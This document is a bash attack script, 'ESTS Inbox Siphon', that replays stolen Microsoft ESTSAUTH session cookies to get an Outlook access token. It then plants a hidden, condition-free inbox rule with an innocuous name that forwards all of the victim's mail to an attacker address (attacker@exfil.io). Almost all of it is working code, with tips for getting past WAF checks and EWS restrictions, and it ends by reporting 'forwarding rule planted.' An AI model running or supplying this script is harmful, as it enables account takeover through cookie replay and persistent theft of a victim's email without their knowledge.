
# ESTS Inbox Siphon.
# !/usr/bin/env bash
# ============================================================
# cookie-login-inbox-rule.sh
# ESTS Cookie → Auth Code → Inbox Forwarding Rule (T1114.003)
#
# Flow:
#   ESTSAUTH + ESTSAUTHPERSISTENT cookies
#   → SSO authorize (d3590ed6, outlook.office.com scope)
#   → auth code → access token
#   → Outlook REST API v2.0 CreateInboxRule
#
# Notes:
#   - Cookie jar expiry must be > 0 (epoch 0 = curl drops the cookie)
#   - Sec-Fetch-* headers required (Microsoft WAF returns 417 without)
#   - sso_reload=True triggers ESTS SSO path, skips login form
#   - response_type=code only — implicit flow disabled on d3590ed6
#   - scope=outlook.office.com/.default gives Mail.ReadWrite implicitly;
#     graph.microsoft.com/.default on d3590ed6 does NOT
#   - EWS blocked on modern tenants (restrict-access-confirm: 1);
#     Outlook REST API v2.0 uses same audience, still works
#
# MITRE: T1114.003 — Email Forwarding Rule
#        T1550.004 — Cookie Replay
# ============================================================

# ── Config — paste values directly here ─────────────────────
ESTSAUTH=""
ESTSAUTHPERSISTENT=""

FORWARD_TO="attacker@exfil.io"
RULE_NAME="Process Receipts - New"

CLIENT_ID="d3590ed6-52b3-4102-aeff-aad2292ab01c"
REDIRECT="https://login.microsoftonline.com/common/oauth2/nativeclient"
SCOPE_ENC="https%3A%2F%2Foutlook.office.com%2F.default+offline_access"
SCOPE_RAW="https://outlook.office.com/.default offline_access"

UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0"
WORKDIR=$(mktemp -d)
COOKIEJAR="$WORKDIR/ests.txt"


# ── Step 1: Write cookie jar ─────────────────────────────────
EXPIRE=$(python3 -c "import time; print(int(time.time()) + 31536000)")

cat > "$COOKIEJAR" << COOKIEEOF
# Netscape HTTP Cookie File
login.microsoftonline.com	FALSE	/	TRUE	${EXPIRE}	ESTSAUTH	${ESTSAUTH}
login.microsoftonline.com	FALSE	/	TRUE	${EXPIRE}	ESTSAUTHPERSISTENT	${ESTSAUTHPERSISTENT}
COOKIEEOF

echo "[*] Cookie jar written  (expiry epoch: $EXPIRE)"

# ── Step 2: SSO → auth code ──────────────────────────────────
AUTH_URL="https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
AUTH_URL+="?client_id=${CLIENT_ID}"
AUTH_URL+="&response_type=code"
AUTH_URL+="&redirect_uri=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${REDIRECT}'))")"
AUTH_URL+="&scope=${SCOPE_ENC}"
AUTH_URL+="&response_mode=query"
AUTH_URL+="&sso_reload=True"

CODE=$(curl -s -i --max-redirs 0 \
  -b "$COOKIEJAR" \
  -H "User-Agent: $UA" \
  -H "Accept: text/html,application/xhtml+xml" \
  -H "Sec-Fetch-Dest: document" \
  -H "Sec-Fetch-Mode: navigate" \
  -H "Sec-Fetch-Site: none" \
  -H "Sec-Fetch-User: ?1" \
  -H "Expect:" \
  "$AUTH_URL" 2>/dev/null \
  | grep -i "^location:" \
  | python3 -c "
import sys, re
m = re.search(r'[?&]code=([^&\s]+)', sys.stdin.read())
print(m.group(1) if m else '')
")

if [[ -z "$CODE" ]]; then
  echo "[!] No auth code — session expired or cookies invalid"
  rm -rf "$WORKDIR"
  return 2>/dev/null || true
fi
echo "[+] Auth code: ${CODE:0:50}..."

# ── Step 3: Exchange code → access token ────────────────────
TOKEN_RESP=$(curl -s -X POST \
  "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
  -H "User-Agent: $UA" \
  -d "grant_type=authorization_code" \
  -d "client_id=${CLIENT_ID}" \
  -d "code=${CODE}" \
  -d "redirect_uri=${REDIRECT}" \
  -d "scope=${SCOPE_RAW}")

ACCESS_TOKEN=$(echo "$TOKEN_RESP" | python3 -c "
import sys, json
d = json.load(sys.stdin)
if 'error' in d:
    print(f'[!] Token error: {d.get(\"error_description\",\"\")[:200]}')
print(d.get('access_token', ''))
")

echo "$TOKEN_RESP" | python3 -c "
import sys, json, base64
d = json.load(sys.stdin)
t = d.get('access_token', '')
p = t.split('.')[1]
p += '=' * (4 - len(p) % 4)
c = json.loads(base64.urlsafe_b64decode(p))
print(f'[+] Signed in as : {c.get(\"upn\",\"\")}')
print(f'[+] Token aud    : {c.get(\"aud\",\"\")}')
print(f'[+] Mail.ReadWrite in scp: {\"Mail.ReadWrite\" in c.get(\"scp\",\"\")}')
"

# ── Step 4: Create forwarding rule ───────────────────────────
echo ""
echo "[*] Creating rule: '$RULE_NAME' → $FORWARD_TO"

RULE_RESP=$(curl -s -i -X POST \
  "https://outlook.office.com/api/v2.0/me/mailfolders/inbox/messagerules" \
  -H "Authorization: Bearer ${ACCESS_TOKEN}" \
  -H "Content-Type: application/json" \
  -H "User-Agent: $UA" \
  -d "{
    \"DisplayName\": \"${RULE_NAME}\",
    \"Sequence\": 1,
    \"IsEnabled\": true,
    \"Conditions\": {},
    \"Actions\": {
      \"ForwardTo\": [{\"EmailAddress\": {\"Address\": \"${FORWARD_TO}\"}}],
      \"StopProcessingRules\": false
    }
  }")

HTTP_STATUS=$(echo "$RULE_RESP" | grep "^HTTP" | awk '{print $2}')

if [[ "$HTTP_STATUS" == "201" ]]; then
  echo "$RULE_RESP" | tail -1 | python3 -c "
import sys, json
d = json.load(sys.stdin)
fwd = [f['EmailAddress']['Address'] for f in d.get('Actions',{}).get('ForwardTo',[])]
print(f'[+] Rule ID    : {d.get(\"Id\")}')
print(f'[+] Name       : {d.get(\"DisplayName\")}')
print(f'[+] Enabled    : {d.get(\"IsEnabled\")}')
print(f'[+] ForwardTo  : {fwd}')
print(f'[+] Sequence   : {d.get(\"Sequence\")}')
"
else
  echo "[!] HTTP $HTTP_STATUS — create failed:"
  echo "$RULE_RESP" | tail -1
fi

# ── Step 5: Verify — list all rules ─────────────────────────
echo ""
echo "[*] Verifying all inbox rules..."
curl -s "https://outlook.office.com/api/v2.0/me/mailfolders/inbox/messagerules" \
  -H "Authorization: Bearer ${ACCESS_TOKEN}" \
  -H "User-Agent: $UA" \
  | python3 -c "
import sys, json
rules = json.load(sys.stdin).get('value', [])
print(f'[+] Total rules: {len(rules)}')
for r in rules:
    fwd   = [f['EmailAddress']['Address'] for f in r.get('Actions',{}).get('ForwardTo',[])]
    redir = [f['EmailAddress']['Address'] for f in r.get('Actions',{}).get('RedirectTo',[])]
    print(f'    [{r[\"Id\"]}] \"{r[\"DisplayName\"]}\"  enabled={r[\"IsEnabled\"]}  fwd={fwd}  redir={redir}')
"

rm -rf "$WORKDIR"
echo ""
echo "[+] Done.  MITRE T1114.003 — inbox forwarding rule planted."
